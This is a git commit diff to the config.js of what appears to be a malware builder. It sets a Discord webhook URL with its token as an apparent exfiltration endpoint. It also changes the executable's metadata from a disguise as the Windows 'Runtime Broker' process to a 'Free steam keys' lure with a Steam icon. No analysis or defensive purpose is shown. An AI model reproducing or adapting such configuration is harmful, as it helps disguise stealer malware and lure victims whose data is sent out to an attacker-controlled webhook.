c1ef898ee759e0f3be001071651a3f898af342c0
Croccoooo <163928697+Croccoooo@users.noreply.github.com>
2024-03-19 21:05:05 +0100

    Update config.js

--- config.js
+++ config.js
@@ -1,12 +1,12 @@
 module.exports = () => {
     return {
-        webhook_url: "REPLACE_ME",
-        icon: './default.ico',
+        webhook_url: "https://discord.com/api/webhooks/1219734615456219288/VoBIFSD5tvVc-WUZdkTHULqf0-rbu_8Bu7lAnlaMtc0vhxVDdHb1xg7XESMUG1oQROQb",
+        icon: './C:\Users\Mattr\Downloads\steam-icon-256x256-k7g0cdza.ico',
         properties: {
-            FileDescription: 'Runtime Broker',
-            ProductName: 'Runtime Broker',
-            LegalCopyright: 'Runtime Broker ©️ 2023',
-            OriginalFilename: 'RuntimeBroker.exe'
+            FileDescription: 'Free steam keys',
+            ProductName: 'Free steam keys',
+            LegalCopyright: 'Steam keys ©️ 2024',
+            OriginalFilename: 'Steamkeys.exe'
         }
     }
 }
